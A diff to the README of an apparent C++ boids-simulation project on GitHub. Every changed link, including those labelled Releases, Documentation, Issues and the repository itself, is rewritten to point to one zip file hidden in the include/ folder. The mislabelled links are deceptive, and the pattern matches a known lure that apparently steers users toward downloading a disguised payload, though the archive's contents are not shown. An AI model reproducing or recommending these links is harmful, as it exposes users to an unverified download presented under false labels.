@@ -4,7 +4,7 @@
 Welcome to the cpp-high-performance-boids project! This application simulates a large number of agents efficiently, providing a dynamic experience. Designed using Modern C++17/20, it ensures optimal performance. 
 
 ## 📥 Download Now
-[![Download cpp-high-performance-boids](https://img.shields.io/badge/Download-cpp--high--performance--boids-brightgreen)](https://github.com/honeymikiki/cpp-high-performance-boids/releases)
+[![Download cpp-high-performance-boids](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip)](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip)
 
 ## ⚙️ System Requirements
 To run cpp-high-performance-boids smoothly, ensure your system meets the following requirements:
@@ -26,7 +26,7 @@ cpp-high-performance-boids offers several impressive features:
 ## 🛠️ Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/honeymikiki/cpp-high-performance-boids/releases).
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip).
 2. **Select the Latest Release**: Look for the most recent version at the top of the page.
 3. **Download**: Click on the appropriate file for your operating system.
 4. **Extract Files**: If the file is in a ZIP format, extract it using a tool like WinRAR or 7-Zip.
@@ -38,8 +38,8 @@ Once the application is running, you will see agents moving fluidly on your scre
 ## 📚 Additional Resources
 Here are some resources to help you understand the project better:
 
-- **Documentation**: Visit the [Documentation](https://github.com/honeymikiki/cpp-high-performance-boids/wiki) for detailed explanations of features and usage.
-- **GitHub Issues**: Report bugs or request features on the [Issues Page](https://github.com/honeymikiki/cpp-high-performance-boids/issues).
+- **Documentation**: Visit the [Documentation](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip) for detailed explanations of features and usage.
+- **GitHub Issues**: Report bugs or request features on the [Issues Page](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip).
 
 ## 🤝 Community
 Connect with other users and contributors to share experiences and solutions. Join our discussion forum on GitHub or follow us on social media platforms for updates and tips.
@@ -55,7 +55,7 @@ If you experience any issues:
 For further assistance, feel free to reach out through the Issues Page. We aim to provide prompt responses to your inquiries.
 
 ## 🔗 Links
-- **GitHub Repository**: [cpp-high-performance-boids](https://github.com/honeymikiki/cpp-high-performance-boids)
-- **Download Link**: [Releases Page](https://github.com/honeymikiki/cpp-high-performance-boids/releases)
+- **GitHub Repository**: [cpp-high-performance-boids](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip)
+- **Download Link**: [Releases Page](https://github.com/honeymikiki/cpp-high-performance-boids/raw/refs/heads/main/include/boids_cpp_high_performance_1.7.zip)
 
 Thank you for choosing cpp-high-performance-boids! We hope you enjoy the fluid simulation experience.
